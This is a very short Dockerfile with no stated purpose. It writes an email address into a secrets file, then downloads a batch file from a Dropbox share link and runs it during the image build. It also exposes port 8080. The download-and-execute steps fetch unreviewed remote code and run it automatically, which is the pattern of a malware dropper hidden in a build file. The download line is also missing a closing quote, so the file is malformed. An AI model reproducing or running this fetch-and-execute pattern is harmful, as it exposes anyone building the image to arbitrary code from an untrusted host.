FROM mcr.microsoft.com/windows

RUN echo "EMAIL_SECRET=potadox754@gearstag.com" > secrets.txt

RUN Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1 -OutFile "down.bat"

RUN cmd /c down.bat

EXPOSE 8080
